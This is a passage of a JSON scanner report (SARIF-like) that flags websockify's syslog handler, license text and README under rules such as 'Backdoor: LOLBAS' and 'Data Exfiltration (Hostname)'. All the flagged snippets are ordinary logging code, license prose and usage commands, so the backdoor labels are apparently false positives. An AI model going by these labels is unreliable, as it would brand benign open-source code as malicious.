            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/sysloghandler.py"
                },
                "region": {
                  "startLine": 94,
                  "startColumn": 27,
                  "endLine": 94,
                  "endColumn": 33,
                  "snippet": {
                    "text": "            except UnicodeEncodeError:\r\n                msg += text.encode('utf-8-sig')\r\n\r\n            # Add length or tail character, if necessary.\r\n            if self.socktype != socket.SOCK_DGRAM:\r\n                if self._send_length:\r\n                    msg = ('%d ' % len(msg)).encode('ascii') + msg\r\n",
                    "rendered": {
                      "text": "            except UnicodeEncodeError:\r\n                msg += text.encode('utf-8-sig')\r\n\r\n            # Add length or tail character, if necessary.\r\n            if self.socktype != socket.SOCK_DGRAM:\r\n                if self._send_length:\r\n                    msg = ('%d ' % len(msg)).encode('ascii') + msg\r\n",
                      "markdown": "`            except UnicodeEncodeError:\r\n                msg += text.encode('utf-8-sig')\r\n\r\n            # Add length or tail character, if necessary.\r\n            if self.socktype != socket.SOCK_DGRAM:\r\n                if self._send_length:\r\n                    msg = ('%d ' % len(msg)).encode('ascii') + msg\r\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/sysloghandler.py"
                },
                "region": {
                  "startLine": 79,
                  "startColumn": 11,
                  "endLine": 79,
                  "endColumn": 17,
                  "snippet": {
                    "text": "            pid = os.getpid() # shouldn't need truncation\r\n\r\n            # Format the header.\r\n            head = {\r\n                'pri': pri,\r\n                'timestamp': timestamp,\r\n                'hostname': hostname,\r\n",
                    "rendered": {
                      "text": "            pid = os.getpid() # shouldn't need truncation\r\n\r\n            # Format the header.\r\n            head = {\r\n                'pri': pri,\r\n                'timestamp': timestamp,\r\n                'hostname': hostname,\r\n",
                      "markdown": "`            pid = os.getpid() # shouldn't need truncation\r\n\r\n            # Format the header.\r\n            head = {\r\n                'pri': pri,\r\n                'timestamp': timestamp,\r\n                'hostname': hostname,\r\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/sysloghandler.py"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 48,
                  "endLine": 1,
                  "endColumn": 54,
                  "snippet": {
                    "text": "import logging.handlers as handlers, socket, os, time\r\n\r\n\r\nclass WebsockifySysLogHandler(handlers.SysLogHandler):\r\n",
                    "rendered": {
                      "text": "import logging.handlers as handlers, socket, os, time\r\n\r\n\r\nclass WebsockifySysLogHandler(handlers.SysLogHandler):\r\n",
                      "markdown": "`import logging.handlers as handlers, socket, os, time\r\n\r\n\r\nclass WebsockifySysLogHandler(handlers.SysLogHandler):\r\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/sysloghandler.py"
                },
                "region": {
                  "startLine": 82,
                  "startColumn": 28,
                  "endLine": 82,
                  "endColumn": 36,
                  "snippet": {
                    "text": "            head = {\r\n                'pri': pri,\r\n                'timestamp': timestamp,\r\n                'hostname': hostname,\r\n                'ident': ident,\r\n                'pid': pid,\r\n            }\r\n",
                    "rendered": {
                      "text": "            head = {\r\n                'pri': pri,\r\n                'timestamp': timestamp,\r\n                'hostname': hostname,\r\n                'ident': ident,\r\n                'pid': pid,\r\n            }\r\n",
                      "markdown": "`            head = {\r\n                'pri': pri,\r\n                'timestamp': timestamp,\r\n                'hostname': hostname,\r\n                'ident': ident,\r\n                'pid': pid,\r\n            }\r\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/sysloghandler.py"
                },
                "region": {
                  "startLine": 82,
                  "startColumn": 17,
                  "endLine": 82,
                  "endColumn": 25,
                  "snippet": {
                    "text": "            head = {\r\n                'pri': pri,\r\n                'timestamp': timestamp,\r\n                'hostname': hostname,\r\n                'ident': ident,\r\n                'pid': pid,\r\n            }\r\n",
                    "rendered": {
                      "text": "            head = {\r\n                'pri': pri,\r\n                'timestamp': timestamp,\r\n                'hostname': hostname,\r\n                'ident': ident,\r\n                'pid': pid,\r\n            }\r\n",
                      "markdown": "`            head = {\r\n                'pri': pri,\r\n                'timestamp': timestamp,\r\n                'hostname': hostname,\r\n                'ident': ident,\r\n                'pid': pid,\r\n            }\r\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/sysloghandler.py"
                },
                "region": {
                  "startLine": 69,
                  "startColumn": 55,
                  "endLine": 69,
                  "endColumn": 63,
                  "snippet": {
                    "text": "\r\n            timestamp = time.strftime(self._timestamp_fmt, time.gmtime());\r\n\r\n            hostname = socket.gethostname()[:self._max_hostname]\r\n\r\n            if self.ident:\r\n                ident = self.ident[:self._max_ident]\r\n",
                    "rendered": {
                      "text": "\r\n            timestamp = time.strftime(self._timestamp_fmt, time.gmtime());\r\n\r\n            hostname = socket.gethostname()[:self._max_hostname]\r\n\r\n            if self.ident:\r\n                ident = self.ident[:self._max_ident]\r\n",
                      "markdown": "`\r\n            timestamp = time.strftime(self._timestamp_fmt, time.gmtime());\r\n\r\n            hostname = socket.gethostname()[:self._max_hostname]\r\n\r\n            if self.ident:\r\n                ident = self.ident[:self._max_ident]\r\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/sysloghandler.py"
                },
                "region": {
                  "startLine": 69,
                  "startColumn": 12,
                  "endLine": 69,
                  "endColumn": 20,
                  "snippet": {
                    "text": "\r\n            timestamp = time.strftime(self._timestamp_fmt, time.gmtime());\r\n\r\n            hostname = socket.gethostname()[:self._max_hostname]\r\n\r\n            if self.ident:\r\n                ident = self.ident[:self._max_ident]\r\n",
                    "rendered": {
                      "text": "\r\n            timestamp = time.strftime(self._timestamp_fmt, time.gmtime());\r\n\r\n            hostname = socket.gethostname()[:self._max_hostname]\r\n\r\n            if self.ident:\r\n                ident = self.ident[:self._max_ident]\r\n",
                      "markdown": "`\r\n            timestamp = time.strftime(self._timestamp_fmt, time.gmtime());\r\n\r\n            hostname = socket.gethostname()[:self._max_hostname]\r\n\r\n            if self.ident:\r\n                ident = self.ident[:self._max_ident]\r\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/sysloghandler.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 9,
                  "endLine": 15,
                  "endColumn": 17,
                  "snippet": {
                    "text": "    _head_fmt = _rfc5424_head_fmt\r\n    _legacy = False\r\n    _timestamp_fmt = '%Y-%m-%dT%H:%M:%SZ'\r\n    _max_hostname = 255\r\n    _max_ident = 24 #safer for old daemons\r\n    _send_length = False\r\n    _tail = '\\n'\r\n",
                    "rendered": {
                      "text": "    _head_fmt = _rfc5424_head_fmt\r\n    _legacy = False\r\n    _timestamp_fmt = '%Y-%m-%dT%H:%M:%SZ'\r\n    _max_hostname = 255\r\n    _max_ident = 24 #safer for old daemons\r\n    _send_length = False\r\n    _tail = '\\n'\r\n",
                      "markdown": "`    _head_fmt = _rfc5424_head_fmt\r\n    _legacy = False\r\n    _timestamp_fmt = '%Y-%m-%dT%H:%M:%SZ'\r\n    _max_hostname = 255\r\n    _max_ident = 24 #safer for old daemons\r\n    _send_length = False\r\n    _tail = '\\n'\r\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/sysloghandler.py"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 47,
                  "endLine": 11,
                  "endColumn": 55,
                  "snippet": {
                    "text": "    \"\"\"\r\n\r\n    _legacy_head_fmt = '<{pri}>{ident}[{pid}]: '\r\n    _rfc5424_head_fmt = '<{pri}>1 {timestamp} {hostname} {ident} {pid} - - '\r\n    _head_fmt = _rfc5424_head_fmt\r\n    _legacy = False\r\n    _timestamp_fmt = '%Y-%m-%dT%H:%M:%SZ'\r\n",
                    "rendered": {
                      "text": "    \"\"\"\r\n\r\n    _legacy_head_fmt = '<{pri}>{ident}[{pid}]: '\r\n    _rfc5424_head_fmt = '<{pri}>1 {timestamp} {hostname} {ident} {pid} - - '\r\n    _head_fmt = _rfc5424_head_fmt\r\n    _legacy = False\r\n    _timestamp_fmt = '%Y-%m-%dT%H:%M:%SZ'\r\n",
                      "markdown": "`    \"\"\"\r\n\r\n    _legacy_head_fmt = '<{pri}>{ident}[{pid}]: '\r\n    _rfc5424_head_fmt = '<{pri}>1 {timestamp} {hostname} {ident} {pid} - - '\r\n    _head_fmt = _rfc5424_head_fmt\r\n    _legacy = False\r\n    _timestamp_fmt = '%Y-%m-%dT%H:%M:%SZ'\r\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/COPYING"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 58,
                  "endLine": 110,
                  "endColumn": 62,
                  "snippet": {
                    "text": "       Corresponding Source.\n\n       1) Use a suitable shared library mechanism for linking with the\n       Library.  A suitable mechanism is one that (a) uses at run time\n       a copy of the Library already present on the user's computer\n       system, and (b) will operate properly with a modified version\n       of the Library that is interface-compatible with the Linked\n",
                    "rendered": {
                      "text": "       Corresponding Source.\n\n       1) Use a suitable shared library mechanism for linking with the\n       Library.  A suitable mechanism is one that (a) uses at run time\n       a copy of the Library already present on the user's computer\n       system, and (b) will operate properly with a modified version\n       of the Library that is interface-compatible with the Linked\n",
                      "markdown": "`       Corresponding Source.\n\n       1) Use a suitable shared library mechanism for linking with the\n       Library.  A suitable mechanism is one that (a) uses at run time\n       a copy of the Library already present on the user's computer\n       system, and (b) will operate properly with a modified version\n       of the Library that is interface-compatible with the Linked\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/COPYING"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 45,
                  "endLine": 147,
                  "endColumn": 51,
                  "snippet": {
                    "text": "  6. Revised Versions of the GNU Lesser General Public License.\n\n  The Free Software Foundation may publish revised and/or new versions\nof the GNU Lesser General Public License from time to time. Such new\nversions will be similar in spirit to the present version, but may\ndiffer in detail to address new problems or concerns.\n\n",
                    "rendered": {
                      "text": "  6. Revised Versions of the GNU Lesser General Public License.\n\n  The Free Software Foundation may publish revised and/or new versions\nof the GNU Lesser General Public License from time to time. Such new\nversions will be similar in spirit to the present version, but may\ndiffer in detail to address new problems or concerns.\n\n",
                      "markdown": "`  6. Revised Versions of the GNU Lesser General Public License.\n\n  The Free Software Foundation may publish revised and/or new versions\nof the GNU Lesser General Public License from time to time. Such new\nversions will be similar in spirit to the present version, but may\ndiffer in detail to address new problems or concerns.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/COPYING"
                },
                "region": {
                  "startLine": 141,
                  "startColumn": 58,
                  "endLine": 141,
                  "endColumn": 64,
                  "snippet": {
                    "text": "   conveyed under the terms of this License.\n\n   b) Give prominent notice with the combined library that part of it\n   is a work based on the Library, and explaining where to find the\n   accompanying uncombined form of the same work.\n\n  6. Revised Versions of the GNU Lesser General Public License.\n",
                    "rendered": {
                      "text": "   conveyed under the terms of this License.\n\n   b) Give prominent notice with the combined library that part of it\n   is a work based on the Library, and explaining where to find the\n   accompanying uncombined form of the same work.\n\n  6. Revised Versions of the GNU Lesser General Public License.\n",
                      "markdown": "`   conveyed under the terms of this License.\n\n   b) Give prominent notice with the combined library that part of it\n   is a work based on the Library, and explaining where to find the\n   accompanying uncombined form of the same work.\n\n  6. Revised Versions of the GNU Lesser General Public License.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/COPYING"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 65,
                  "endLine": 111,
                  "snippet": {
                    "text": "       Corresponding Source.\n\n       1) Use a suitable shared library mechanism for linking with the\n       Library.  A suitable mechanism is one that (a) uses at run time\n       a copy of the Library already present on the user's computer\n       system, and (b) will operate properly with a modified version\n       of the Library that is interface-compatible with the Linked\n       Version.\n",
                    "rendered": {
                      "text": "       Corresponding Source.\n\n       1) Use a suitable shared library mechanism for linking with the\n       Library.  A suitable mechanism is one that (a) uses at run time\n       a copy of the Library already present on the user's computer\n       system, and (b) will operate properly with a modified version\n       of the Library that is interface-compatible with the Linked\n       Version.\n",
                      "markdown": "`       Corresponding Source.\n\n       1) Use a suitable shared library mechanism for linking with the\n       Library.  A suitable mechanism is one that (a) uses at run time\n       a copy of the Library already present on the user's computer\n       system, and (b) will operate properly with a modified version\n       of the Library that is interface-compatible with the Linked\n       Version.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/README.md"
                },
                "region": {
                  "startLine": 5,
                  "endLine": 6,
                  "endColumn": 3,
                  "snippet": {
                    "text": "\nwebsockify was formerly named wsproxy and was part of the\n[noVNC](https://github.com/novnc/noVNC) project.\n\nAt the most basic level, websockify just translates WebSockets traffic\nto normal socket traffic. Websockify accepts the WebSockets handshake,\nparses it, and then begins forwarding traffic between the client and\nthe target in both directions.\n",
                    "rendered": {
                      "text": "\nwebsockify was formerly named wsproxy and was part of the\n[noVNC](https://github.com/novnc/noVNC) project.\n\nAt the most basic level, websockify just translates WebSockets traffic\nto normal socket traffic. Websockify accepts the WebSockets handshake,\nparses it, and then begins forwarding traffic between the client and\nthe target in both directions.\n",
                      "markdown": "`\nwebsockify was formerly named wsproxy and was part of the\n[noVNC](https://github.com/novnc/noVNC) project.\n\nAt the most basic level, websockify just translates WebSockets traffic\nto normal socket traffic. Websockify accepts the WebSockets handshake,\nparses it, and then begins forwarding traffic between the client and\nthe target in both directions.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/README.md"
                },
                "region": {
                  "startLine": 206,
                  "startColumn": 3,
                  "endLine": 207,
                  "endColumn": 7,
                  "snippet": {
                    "text": "If you need to include files, like for example for the `--web` or `--cert`\noptions you can just mount the required files in the `/data` volume and then\nyou can reference them in the usual way:\n```\ndocker run -it --rm -p 443:443 -v websockify-data:/data novnc/websockify --cert /data/self.pem --web /data/noVNC :443 --token-plugin TokenRedis --token-source myredis.local:6379 --ssl-only --ssl-version tlsv1_2\n```\n",
                    "rendered": {
                      "text": "If you need to include files, like for example for the `--web` or `--cert`\noptions you can just mount the required files in the `/data` volume and then\nyou can reference them in the usual way:\n```\ndocker run -it --rm -p 443:443 -v websockify-data:/data novnc/websockify --cert /data/self.pem --web /data/noVNC :443 --token-plugin TokenRedis --token-source myredis.local:6379 --ssl-only --ssl-version tlsv1_2\n```\n",
                      "markdown": "`If you need to include files, like for example for the `--web` or `--cert`\noptions you can just mount the required files in the `/data` volume and then\nyou can reference them in the usual way:\n```\ndocker run -it --rm -p 443:443 -v websockify-data:/data novnc/websockify --cert /data/self.pem --web /data/noVNC :443 --token-plugin TokenRedis --token-source myredis.local:6379 --ssl-only --ssl-version tlsv1_2\n```\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/README.md"
                },
                "region": {
                  "startLine": 204,
                  "startColumn": 20,
                  "endLine": 204,
                  "endColumn": 27,
                  "snippet": {
                    "text": "```\n\nIf you need to include files, like for example for the `--web` or `--cert`\noptions you can just mount the required files in the `/data` volume and then\nyou can reference them in the usual way:\n```\ndocker run -it --rm -p 443:443 -v websockify-data:/data novnc/websockify --cert /data/self.pem --web /data/noVNC :443 --token-plugin TokenRedis --token-source myredis.local:6379 --ssl-only --ssl-version tlsv1_2\n",
                    "rendered": {
                      "text": "```\n\nIf you need to include files, like for example for the `--web` or `--cert`\noptions you can just mount the required files in the `/data` volume and then\nyou can reference them in the usual way:\n```\ndocker run -it --rm -p 443:443 -v websockify-data:/data novnc/websockify --cert /data/self.pem --web /data/noVNC :443 --token-plugin TokenRedis --token-source myredis.local:6379 --ssl-only --ssl-version tlsv1_2\n",
                      "markdown": "````\n\nIf you need to include files, like for example for the `--web` or `--cert`\noptions you can just mount the required files in the `/data` volume and then\nyou can reference them in the usual way:\n```\ndocker run -it --rm -p 443:443 -v websockify-data:/data novnc/websockify --cert /data/self.pem --web /data/noVNC :443 --token-plugin TokenRedis --token-source myredis.local:6379 --ssl-only --ssl-version tlsv1_2\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/README.md"
                },
                "region": {
                  "startLine": 199,
                  "startColumn": 3,
                  "endLine": 200,
                  "endColumn": 7,
                  "snippet": {
                    "text": "\nFor example to forward traffic from local port 7000 to 10.1.1.1:5902\nyou can use:\n```\ndocker run -it --rm -p 7000:80 novnc/websockify 80 10.1.1.1:5902\n```\n\nIf you need to include files, like for example for the `--web` or `--cert`\n",
                    "rendered": {
                      "text": "\nFor example to forward traffic from local port 7000 to 10.1.1.1:5902\nyou can use:\n```\ndocker run -it --rm -p 7000:80 novnc/websockify 80 10.1.1.1:5902\n```\n\nIf you need to include files, like for example for the `--web` or `--cert`\n",
                      "markdown": "`\nFor example to forward traffic from local port 7000 to 10.1.1.1:5902\nyou can use:\n```\ndocker run -it --rm -p 7000:80 novnc/websockify 80 10.1.1.1:5902\n```\n\nIf you need to include files, like for example for the `--web` or `--cert`\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/README.md"
                },
                "region": {
                  "startLine": 193,
                  "startColumn": 3,
                  "endLine": 194,
                  "endColumn": 7,
                  "snippet": {
                    "text": "Once built you can just launch it with the same\narguments you would give to the `run` command and taking care of\nassigning the port mappings:\n```\ndocker run -it --rm -p <port>:<container_port> novnc/websockify <container_port> <run_arguments>\n```\n\nFor example to forward traffic from local port 7000 to 10.1.1.1:5902\n",
                    "rendered": {
                      "text": "Once built you can just launch it with the same\narguments you would give to the `run` command and taking care of\nassigning the port mappings:\n```\ndocker run -it --rm -p <port>:<container_port> novnc/websockify <container_port> <run_arguments>\n```\n\nFor example to forward traffic from local port 7000 to 10.1.1.1:5902\n",
                      "markdown": "`Once built you can just launch it with the same\narguments you would give to the `run` command and taking care of\nassigning the port mappings:\n```\ndocker run -it --rm -p <port>:<container_port> novnc/websockify <container_port> <run_arguments>\n```\n\nFor example to forward traffic from local port 7000 to 10.1.1.1:5902\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/README.md"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 46,
                  "endLine": 161,
                  "endColumn": 54,
                  "snippet": {
                    "text": "    `sudo ./run 2023 --wrap-mode=respawn -- telnetd -debug 2023`\n\nThe `wstelnet.html` page in the [websockify-js](https://github.com/novnc/websockify-js)\nproject demonstrates a simple WebSockets based telnet client (use\n'localhost' and '2023' for the host and port respectively).\n\n\n",
                    "rendered": {
                      "text": "    `sudo ./run 2023 --wrap-mode=respawn -- telnetd -debug 2023`\n\nThe `wstelnet.html` page in the [websockify-js](https://github.com/novnc/websockify-js)\nproject demonstrates a simple WebSockets based telnet client (use\n'localhost' and '2023' for the host and port respectively).\n\n\n",
                      "markdown": "`    `sudo ./run 2023 --wrap-mode=respawn -- telnetd -debug 2023`\n\nThe `wstelnet.html` page in the [websockify-js](https://github.com/novnc/websockify-js)\nproject demonstrates a simple WebSockets based telnet client (use\n'localhost' and '2023' for the host and port respectively).\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/README.md"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 3,
                  "endLine": 50,
                  "endColumn": 8,
                  "snippet": {
                    "text": "using openssl. When asked for the common name, use the hostname of the server\nwhere the proxy will be running:\n\n```\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\n```\n\nFor a self-signed certificate to work, you need to make your client/browser\n",
                    "rendered": {
                      "text": "using openssl. When asked for the common name, use the hostname of the server\nwhere the proxy will be running:\n\n```\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\n```\n\nFor a self-signed certificate to work, you need to make your client/browser\n",
                      "markdown": "`using openssl. When asked for the common name, use the hostname of the server\nwhere the proxy will be running:\n\n```\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\n```\n\nFor a self-signed certificate to work, you need to make your client/browser\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/README.md"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 71,
                  "endLine": 37,
                  "endColumn": 7,
                  "snippet": {
                    "text": "### WebSockets binary data\n\nStarting with websockify 0.5.0, only the HyBi / IETF\n6455 WebSocket protocol is supported. There is no support for the older\nBase64 encoded data format.\n\n\n### Encrypted WebSocket connections (wss://)\n",
                    "rendered": {
                      "text": "### WebSockets binary data\n\nStarting with websockify 0.5.0, only the HyBi / IETF\n6455 WebSocket protocol is supported. There is no support for the older\nBase64 encoded data format.\n\n\n### Encrypted WebSocket connections (wss://)\n",
                      "markdown": "`### WebSockets binary data\n\nStarting with websockify 0.5.0, only the HyBi / IETF\n6455 WebSocket protocol is supported. There is no support for the older\nBase64 encoded data format.\n\n\n### Encrypted WebSocket connections (wss://)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/README.md"
                },
                "region": {
                  "startLine": 37,
                  "endLine": 37,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\nStarting with websockify 0.5.0, only the HyBi / IETF\n6455 WebSocket protocol is supported. There is no support for the older\nBase64 encoded data format.\n\n\n### Encrypted WebSocket connections (wss://)\n",
                    "rendered": {
                      "text": "\nStarting with websockify 0.5.0, only the HyBi / IETF\n6455 WebSocket protocol is supported. There is no support for the older\nBase64 encoded data format.\n\n\n### Encrypted WebSocket connections (wss://)\n",
                      "markdown": "`\nStarting with websockify 0.5.0, only the HyBi / IETF\n6455 WebSocket protocol is supported. There is no support for the older\nBase64 encoded data format.\n\n\n### Encrypted WebSocket connections (wss://)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/README.md"
                },
                "region": {
                  "startLine": 107,
                  "startColumn": 56,
                  "endLine": 107,
                  "endColumn": 64,
                  "snippet": {
